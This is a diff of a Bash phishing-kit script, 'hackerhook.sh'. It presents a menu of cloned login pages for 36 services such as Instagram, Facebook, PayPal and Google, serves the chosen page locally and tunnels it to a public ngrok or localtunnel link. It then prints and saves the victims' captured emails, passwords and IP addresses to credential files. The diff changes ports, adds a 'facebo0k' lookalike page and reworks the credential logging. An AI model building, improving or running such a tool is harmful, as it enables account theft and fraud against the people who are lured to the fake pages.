@@ -39,35 +39,35 @@ UWhite='\033[4;37m'       # White
 if [ "$EUID" -ne 0 ]
   then
       printf "${Red}Opps! ${BGreen}'sudo' ${Red}Please!\n"
-  exit
+      exit
 fi
 trap 'printf "\n";stop;exit 1' 2
 
 stop() {
 
-printf "${Green}[${BRed}R${Green}]${BGreen} Re-Run the script\n"
-printf "${Green}[${BRed}X${Green}]${BGreen} Exit\n"
-read -p "Option: " guard
+  printf "${Green}[${BRed}R${Green}]${BGreen} Re-Run the script\n"
+  printf "${Green}[${BRed}X${Green}]${BGreen} Exit\n"
+  read -p "Option: " guard
 
 if [[ $guard == R || $guard == r ]]; then
-sleep 1
-killall -2 php > /dev/null 2>&1
-killall -2 lt > /dev/null 2>&1
-killall -2 xterm > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
-killall ssh > /dev/null 2>&1
+    sleep 1
+    killall -2 php > /dev/null 2>&1
+    killall -2 lt > /dev/null 2>&1
+    killall -2 xterm > /dev/null 2>&1
+    killall -2 ngrok > /dev/null 2>&1
+    killall ssh > /dev/null 2>&1
 if [[ -e sendlink ]]; then
-rm -rf sendlink
+    rm -rf sendlink
 fi
-sleep 0.5
-./hackerhook.sh
+    sleep 0.5
+    ./hackerhook.sh
 
 elif [[ $guard == X || $guard == x ]]; then
-sleep 2
-stop1
+    sleep 2
+    stop1
 
 else
-stop1
+    stop1
 fi
 
 }
@@ -79,220 +79,224 @@ checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkssh=$(ps aux | grep -o "ssh" | head -n1)
 if [[ $checkngrok == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
+    pkill -f -2 ngrok > /dev/null 2>&1
+    killall -2 ngrok > /dev/null 2>&1
 fi
 if [[ $checknode == *'node'* ]]; then
-pkill -f -2 node > /dev/null 2>&1
-killall -2 node > /dev/null 2>&1
+    pkill -f -2 node > /dev/null 2>&1
+    killall -2 node > /dev/null 2>&1
 fi
 if [[ $checkphp == *'php'* ]]; then
-pkill -f -2 php > /dev/null 2>&1
-killall -2 php > /dev/null 2>&1
+    pkill -f -2 php > /dev/null 2>&1
+    killall -2 php > /dev/null 2>&1
 fi
 if [[ $checkssh == *'ssh'* ]]; then
-pkill -f -2 ssh > /dev/null 2>&1
-killall ssh > /dev/null 2>&1
+    pkill -f -2 ssh > /dev/null 2>&1
+    killall ssh > /dev/null 2>&1
 fi
 if [[ -e sendlink ]]; then
-rm -rf sendlink
+    rm -rf sendlink
 fi
 
 }
 
 dependencies() {
 
-command -v php > /dev/null 2>&1 || { echo >&2 "${Red}I require php but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "${Red}I require wget but it's not installed. Install it. Aborting."; exit 1; }
-command -v unzip > /dev/null 2>&1 || { echo >&2 "${Red}I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v curl > /dev/null 2>&1 || { echo >&2 "${Red}I require curl but it's not installed. Install it. Aborting."; exit 1; }
-command -v lt > /dev/null 2>&1 || { echo >&2 "${Red}I require localtunnel but it's not installed. Install it. Aborting."; exit 1; }
-command -v ngrok > /dev/null 2>&1 || { echo >&2 "${Red}I require ngrok but it's not installed. Install it. Aborting."; exit 1; }
+  command -v php > /dev/null 2>&1 || { echo >&2 "${Red}I require php but it's not installed. Install it. Aborting."; exit 1; }
+  command -v wget > /dev/null 2>&1 || { echo >&2 "${Red}I require wget but it's not installed. Install it. Aborting."; exit 1; }
+  command -v unzip > /dev/null 2>&1 || { echo >&2 "${Red}I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+  command -v curl > /dev/null 2>&1 || { echo >&2 "${Red}I require curl but it's not installed. Install it. Aborting."; exit 1; }
+  command -v lt > /dev/null 2>&1 || { echo >&2 "${Red}I require localtunnel but it's not installed. Install it. Aborting."; exit 1; }
+  command -v ngrok > /dev/null 2>&1 || { echo >&2 "${Red}I require ngrok but it's not installed. Install it. Aborting."; exit 1; }
 
 }
 
 banner() {
 clear
 sleep 1
-printf "${BRed}██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗${BWhite}       ${BBlack}██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗\n"
-printf "${BRed}██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗${BWhite}      ${BBlack}██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝\n"
-printf "${BRed}███████║███████║██║     █████╔╝ █████╗  ██████╔╝${BWhite}█████╗${BBlack}███████║██║   ██║██║   ██║█████╔╝ \n"
-printf "${BRed}██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗${BWhite}╚════╝${BBlack}██╔══██║██║   ██║██║   ██║██╔═██╗ \n"
-printf "${BRed}██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║${BWhite}      ${BBlack}██║  ██║╚██████╔╝╚██████╔╝██║  ██╗\n"
-printf "${BRed}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${BWhite}      ${BBlack}╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝\n"
-printf "=========================================================================================\n"
-printf "                                                                          ${White}by: ${BGreen}John${BRed}Smith\n"
-echo ""
+    printf "${BRed}██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗${BWhite}       ${BBlack}██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗\n"
+    printf "${BRed}██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗${BWhite}      ${BBlack}██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝\n"
+    printf "${BRed}███████║███████║██║     █████╔╝ █████╗  ██████╔╝${BWhite}█████╗${BBlack}███████║██║   ██║██║   ██║█████╔╝ \n"
+    printf "${BRed}██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗${BWhite}╚════╝${BBlack}██╔══██║██║   ██║██║   ██║██╔═██╗ \n"
+    printf "${BRed}██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║${BWhite}      ${BBlack}██║  ██║╚██████╔╝╚██████╔╝██║  ██╗\n"
+    printf "${BRed}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${BWhite}      ${BBlack}╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝\n"
+    printf "=========================================================================================\n"
+    printf "                                                                        ${White}by: ${BGreen}John${BRed}Smith_2.8\n"
+    echo ""
 
 }
 
 banner2() {
 clear
 sleep 1
-printf "${BRed} _   _            _            ${BWhite}       ${BGreen} _   _             _     \n"
-printf "${BRed}| | | |          | |           ${BWhite}       ${BGreen}| | | |           | |    \n"
-printf "${BRed}| |_| | __ _  ___| | _____ _ __${BWhite} ______${BGreen}| |_| | ___   ___ | | __ \n"
-printf "${BRed}|  _  |/ _' |/ __| |/ / _ \ '__${BWhite}|______${BGreen}|  _  |/ _ \ / _ \| |/ / \n"
-printf "${BRed}| | | | (_| | (__|   <  __/ |  ${BWhite}       ${BGreen}| | | | (_) | (_) |   <  \n"
-printf "${BRed}\_| |_/\__,_|\___|_|\_\___|_|  ${BWhite}       ${BGreen}\_| |_/\___/ \___/|_|\_\ \n"
-printf "_________________________________________________________________\n"
-printf "                                                  ${White}by: ${BGreen}John${BRed}Smith\n"
+    printf "${BRed} _   _            _            ${BWhite}       ${BGreen} _   _             _     \n"
+    printf "${BRed}| | | |          | |           ${BWhite}       ${BGreen}| | | |           | |    \n"
+    printf "${BRed}| |_| | __ _  ___| | _____ _ __${BWhite} ______${BGreen}| |_| | ___   ___ | | __ \n"
+    printf "${BRed}|  _  |/ _' |/ __| |/ / _ \ '__${BWhite}|______${BGreen}|  _  |/ _ \ / _ \| |/ / \n"
+    printf "${BRed}| | | | (_| | (__|   <  __/ |  ${BWhite}       ${BGreen}| | | | (_) | (_) |   <  \n"
+    printf "${BRed}\_| |_/\__,_|\___|_|\_\___|_|  ${BWhite}       ${BGreen}\_| |_/\___/ \___/|_|\_\ \n"
+    printf "_________________________________________________________________\n"
+    printf "                                               ${White}by: ${BGreen}John${BRed}Smith_2.8\n"
 }
 
 menu() {
-printf "${Red}[${White}01${Red}]${BGreen} -Instagram     ${Red}[${White}11${Red}]${BGreen} -Steam              ${Red}[${White}21${Red}]${BGreen} -Verizon       ${Red}[${White}31${Red}]${BGreen} -Yandex\n"
-printf "${Red}[${White}02${Red}]${BGreen} -Facebook      ${Red}[${White}12${Red}]${BGreen} -Yahoo              ${Red}[${White}22${Red}]${BGreen} -DropBox       ${Red}[${White}32${Red}]${BGreen} -devianART\n"
-printf "${Red}[${White}03${Red}]${BGreen} -Snapchat      ${Red}[${White}13${Red}]${BGreen} -Linkedin           ${Red}[${White}23${Red}]${BGreen} -Adove ID      ${Red}[${White}33${Red}]${BGreen} -Dreamland (added)\n"
-printf "${Red}[${White}04${Red}]${BGreen} -Twitter       ${Red}[${White}14${Red}]${BGreen} -ProtonMail         ${Red}[${White}24${Red}]${BGreen} -Shopify       ${Red}[${White}34${Red}]${BGreen} -Genyo (Added)\n"
-printf "${Red}[${White}05${Red}]${BGreen} -Github        ${Red}[${White}15${Red}]${BGreen} -WordPress          ${Red}[${White}25${Red}]${BGreen} -Messenger     ${Red}[${White}35${Red}]${BGreen} -Lazada (Added)\n"
-printf "${Red}[${White}06${Red}]${BGreen} -Google        ${Red}[${White}16${Red}]${BGreen} -Microsoft          ${Red}[${White}26${Red}]${BGreen} -GitLab        ${Red}[${White}36${Red}]${BGreen} -Shopee (Added)\n"
-printf "${Red}[${White}07${Red}]${BGreen} -Spotify       ${Red}[${White}17${Red}]${BGreen} -IGFollowers        ${Red}[${White}27${Red}]${BGreen} -Twitch        ${Red}[${White}X${Red}]${BRed}  -Exit${Red}\n"
-printf "${Red}[${White}08${Red}]${BGreen} -Netflix       ${Red}[${White}18${Red}]${BGreen} -eBay               ${Red}[${White}28${Red}]${BGreen} -MySpace       \n"
-printf "${Red}[${White}09${Red}]${BGreen} -Paypal        ${Red}[${White}19${Red}]${BGreen} -Pinterest          ${Red}[${White}29${Red}]${BGreen} -Badoo         \n"
-printf "${Red}[${White}10${Red}]${BGreen} -Origin        ${Red}[${White}20${Red}]${BGreen} -CryptoCurrency     ${Red}[${White}30${Red}]${BGreen} -VK            \n"
-printf "${Green}"
-echo ""
+    printf "${Red}[${White}01${Red}]${BGreen} -Instagram     ${Red}[${White}11${Red}]${BGreen} -Steam              ${Red}[${White}21${Red}]${BGreen} -Verizon       ${Red}[${White}31${Red}]${BGreen} -Yandex\n"
+    printf "${Red}[${White}02${Red}]${BGreen} -Facebook      ${Red}[${White}12${Red}]${BGreen} -Yahoo              ${Red}[${White}22${Red}]${BGreen} -DropBox       ${Red}[${White}32${Red}]${BGreen} -devianART\n"
+    printf "${Red}[${White}03${Red}]${BGreen} -Snapchat      ${Red}[${White}13${Red}]${BGreen} -Linkedin           ${Red}[${White}23${Red}]${BGreen} -Adove ID      ${Red}[${White}33${Red}]${BGreen} -Dreamland (added)\n"
+    printf "${Red}[${White}04${Red}]${BGreen} -Twitter       ${Red}[${White}14${Red}]${BGreen} -ProtonMail         ${Red}[${White}24${Red}]${BGreen} -Shopify       ${Red}[${White}34${Red}]${BGreen} -Genyo (Added beta)\n"
+    printf "${Red}[${White}05${Red}]${BGreen} -Github        ${Red}[${White}15${Red}]${BGreen} -WordPress          ${Red}[${White}25${Red}]${BGreen} -Messenger     ${Red}[${White}35${Red}]${BGreen} -Lazada (Added beta)\n"
+    printf "${Red}[${White}06${Red}]${BGreen} -Google        ${Red}[${White}16${Red}]${BGreen} -Microsoft          ${Red}[${White}26${Red}]${BGreen} -GitLab        ${Red}[${White}36${Red}]${BGreen} -Shopee (Added beta)\n"
+    printf "${Red}[${White}07${Red}]${BGreen} -Spotify       ${Red}[${White}17${Red}]${BGreen} -IGFollowers        ${Red}[${White}27${Red}]${BGreen} -Twitch        ${Red}[${White}X${Red}]${BRed}  -Exit${Red}\n"
+    printf "${Red}[${White}08${Red}]${BGreen} -Netflix       ${Red}[${White}18${Red}]${BGreen} -eBay               ${Red}[${White}28${Red}]${BGreen} -MySpace       \n"
+    printf "${Red}[${White}09${Red}]${BGreen} -Paypal        ${Red}[${White}19${Red}]${BGreen} -Pinterest          ${Red}[${White}29${Red}]${BGreen} -Badoo         \n"
+    printf "${Red}[${White}10${Red}]${BGreen} -Origin        ${Red}[${White}20${Red}]${BGreen} -CryptoCurrency     ${Red}[${White}30${Red}]${BGreen} -VK            \n"
+    printf "${Green}"
+    echo ""
 read -p "Option: " option
 
 
 if [[ $option == 1 || $option == 01 ]]; then
-site="instagram"
-server
+    site="instagram"
+    server
 
 elif [[ $option == 2 || $option == 02 ]]; then
-menu2
+    menu2
+
 elif [[ $option == 3 || $option == 03 ]]; then
-site="snapchat"
-server
+    site="snapchat"
+    server
+
 elif [[ $option == 4 || $option == 04 ]]; then
-site="twitter"
-server
+    site="twitter"
+    server
+
 elif [[ $option == 5 || $option == 05 ]]; then
-site="github"
-server
+    site="github"
+    server
+
 elif [[ $option == 6 || $option == 06 ]]; then
-site="google"
-server
+    site="google"
+    server
 
 elif [[ $option == 7 || $option == 07 ]]; then
-site="spotify"
-server
+    site="spotify"
+    server
 
 elif [[ $option == 8 || $option == 08 ]]; then
-site="netflix"
-server
+    site="netflix"
+    server
 
 elif [[ $option == 9 || $option == 09 ]]; then
-site="paypal"
-server
+    site="paypal"
+    server
 
 elif [[ $option == 10 ]]; then
-site="origin"
-server
+    site="origin"
+    server
 
 elif [[ $option == 11 ]]; then
-site="steam"
-server
+    site="steam"
+    server
 
 elif [[ $option == 12 ]]; then
-site="yahoo"
-server
+    site="yahoo"
+    server
 
 elif [[ $option == 13 ]]; then
-site="linkedin"
-server
+    site="linkedin"
+    server
 
 elif [[ $option == 14 ]]; then
-site="protonmail"
-server
+    site="protonmail"
+    server
 
 elif [[ $option == 15 ]]; then
-site="wordpress"
-server
+    site="wordpress"
+    server
 
 elif [[ $option == 16 ]]; then
-site="microsoft"
-server
+    site="microsoft"
+    server
 
 elif [[ $option == 17 ]]; then
-site="instafollowers"
-server
+    site="instafollowers"
+    server
 
 elif [[ $option == 18 ]]; then
-site="shopping"
-server
+    site="shopping"
+    server
 
 elif [[ $option == 19 ]]; then
-site="pinterest"
-server
+    site="pinterest"
+    server
 
 elif [[ $option == 20 ]]; then
-site="cryptocurrency"
-server
+    site="cryptocurrency"
+    server
 
 elif [[ $option == 21 ]]; then
-site="verizon"
-server
+    site="verizon"
+    server
 
 elif [[ $option == 22 ]]; then
-site="dropbox"
-server
+    site="dropbox"
+    server
 
 elif [[ $option == 23 ]]; then
-site="adobe"
-server
+    site="adobe"
+    server
 
 elif [[ $option == 24 ]]; then
-site="shopify"
-server
+    site="shopify"
+    server
 
 elif [[ $option == 25 ]]; then
-site="messenger"
-server
+    site="messenger"
+    server
 
 elif [[ $option == 26 ]]; then
-site="gitlab"
-server
+    site="gitlab"
+    server
 
 elif [[ $option == 27 ]]; then
-site="twitch"
-server
+    site="twitch"
+    server
 
 elif [[ $option == 28 ]]; then
-site="myspace"
-server
+    site="myspace"
+    server
 
 elif [[ $option == 29 ]]; then
-site="badoo"
-server
+    site="badoo"
+    server
 
 elif [[ $option == 30 ]]; then
-site="vk"
-server
+    site="vk"
+    server
 
 elif [[ $option == 31 ]]; then
-site="yandex"
-server
+    site="yandex"
+    server
 
 elif [[ $option == 32 ]]; then
-site="devianart"
-server
+    site="devianart"
+    server
 
 elif [[ $option == 33 ]]; then
-site="dreamland"
-server
+    site="dreamland"
+    server
 
 elif [[ $option == 34 ]]; then
-site="genyo"
-server
+    site="genyo"
+    server
 
 elif [[ $option == 35 ]]; then
-site="lazada"
-server
+    site="lazada"
+    server
 
 elif [[ $option == 36 ]]; then
-site="shopee"
-server
+    site="shopee"
+    server
 
 elif [[ $option == x || $option == X ]]; then
 exit 1
@@ -307,19 +311,19 @@ fi
 }
 
 menu2() {
-printf "${Red}[${White}01${Red}]${BGreen} -Facebook"
+printf "${Red}[${White}01${Red}]${BGreen} -Facebook\n"
 printf "${Red}[${White}02${Red}]${BGreen} -New Facebook"
 echo ""
 read -p "Option: " option
 
 if [[ $option == 1 || $option == 01 ]]; then
-site="facebook"
-server
+    site="facebook"
+    server
 elif [[ $option == 2 || $option == 02 ]]; then
-site="fb"
-server
+    site="facebo0k"
+    server
 else
-exit
+    exit
 fi
 
 }
@@ -327,30 +331,49 @@ fi
 server1() {
 banner2
 if [[ -e webpage/$site/ip.txt ]]; then
-rm -rf webpage/$site/ip.txt
+    rm -rf webpage/$site/ip.txt
 
 fi
 if [[ -e webpage/$site/usernames.txt ]]; then
-rm -rf webpage/$site/usernames.txt
+    rm -rf webpage/$site/usernames.txt
 
 fi
 
+# if [[ -e webpage/credentials.txt ]]; then
+# echo '-----------------------------------/n' >> webpage/credentials.txt
+
+# else
+# echo '1' >> webpage/credentials.txt
+
+# fi
 
 printf "${Yellow}Starting ${BGreen}PHP ${Green}server\n"
-cd webpage/$site && xterm -geometry 90x26+1000 -T "PHP server" -hold -e "php -S 127.0.0.1:3333" > /dev/null 2>&1 & 
+cd webpage/$site && xterm -geometry 90x26+1000 -T "PHP server" -hold -e "php -S 127.0.0.1:80" > /dev/null 2>&1 & 
 sleep 5
 printf "${BGreen}OK.${clear}\n"
 printf "${Yellow}Starting ${BGreen}NGROK ${Green}server\n"
-xterm -T "NGROK server" -geometry 90x26+1000+1000 -hold -e "/usr/local/bin/ngrok http 3333" > /dev/null 2>&1 &
+xterm -T "NGROK server" -geometry 90x26+1000+1000 -hold -e "/usr/local/bin/ngrok http 80" > /dev/null 2>&1 &
 sleep 10
 printf "${BGreen}OK.${clear}\n\n"
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[-0-9a-z]*\.ngrok.io')
+sleep 3
 printf "${BYellow}Your Domain is:${BGreen} %s\e[0m\n" $link
 printf "\n"
 sleep 2
-printf "We"
-xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
-sleep 1
+#printf "We"
+if [[ -e webpage/credentials.txt ]]; then
+    echo "----------------------------------" > webpage/credentials.txt
+    printf "\nWebsite: $site \n\n" >> webpage/credentials.txt
+    xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
+    sleep 1
+
+else
+    printf '0' > webpage/credentials.txt
+    echo "----------------------------------" > webpage/credentials.txt
+    printf "\nWebsite: $site \n\n" >> webpage/credentials.txt
+    xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
+    sleep 1
+fi
 
 checkfound
 
@@ -367,6 +390,14 @@ rm -rf webpage/$site/usernames.txt
 
 fi
 
+# if [[ -e webpage/credentials.txt ]]; then
+# echo '-----------------------------------/n' >> webpage/credentials.txt
+
+# else
+# echo '1' >> webpage/credentials.txt
+
+# fi
+
 printf "${Yellow}Starting ${BGreen}PHP ${Green}server\n"
 cd webpage/$site && xterm -geometry 90x26+1000 -hold -T "PHP server" -e "php -S 127.0.0.1:443" > /dev/null 2>&1 &
 sleep 5
@@ -378,9 +409,26 @@ printf "${BGreen}OK.${clear}\n\n"
 printf "${BYellow}Your URL name is: ${BGreen}https://wmw-$site-com.loca.lt\n"
 printf "\n"
 sleep 2
+if [[ -e webpage/credentials.txt ]]; then
 printf "Website: $site \n\n" > webpage/credentials.txt
 xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
 sleep 1
+
+else
+printf '0' > webpage/credentials.txt
+printf "Website: $site \n\n" > webpage/credentials.txt
+xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
+sleep 1
+fi
+
+#if [[ -e credentials ]]; then
+#cat webpage/credentials.txt >> credentials
+
+#else
+#echo credentials
+#cat webpage/credentials.txt >> credentials
+
+#fi
 
 checkfound
 #===============================================
@@ -408,16 +456,19 @@ IFS=$'\n'
 password=$(grep -o 'Pass:.*' webpage/$site/usernames.txt | cut -d ":" -f2)
 printf "${BGreen}Got the Email: ${White}%s\n\e[0m" $account
 printf "${BGreen}Got the Password: ${White}%s\n\e[0m" $password
-printf "\nIP Addr:" > webpage/credentials.txt
-cat webpage/$site/ip.txt | grep IP >> webpage/credentials.txt
-printf "\nAccount:" > webpage/credentials.txt
+printf "IP Addr: " >> webpage/credentials.txt 
+cat webpage/$site/ip.txt | grep IP | cut -d ":" -f2 | cut -d " " -f2 >> webpage/credentials.txt
+#cat webpage/$site/ip.txt | grep IP | cut -d ":" -f2 | cut -d " " -f2  >> Credentials
+printf "\n" >> webpage/credentials.txt
 cat webpage/$site/usernames.txt >> webpage/credentials.txt
 echo "==================================" >> webpage/credentials.txt
-if [[ -e Credentials.txt ]]; then
-cat webpage/credentials.txt >> Credentials.txt
+if [[ -e Credentials ]]; then
+printf "Credential:\n" >> Credentials
+cat webpage/credentials.txt >> Credentials
+
 else
-printf "Credential:\n" >> Credentials.txt
-cat webpage/credentials.txt >> Credentials.txt
+printf "Credential:\n" >> Credentials
+cat webpage/credentials.txt >> Credentials
 fi
 #======================================
 printf "${UGreen}Saved: ${White}webpage/credentials.txt\e[0m\n"
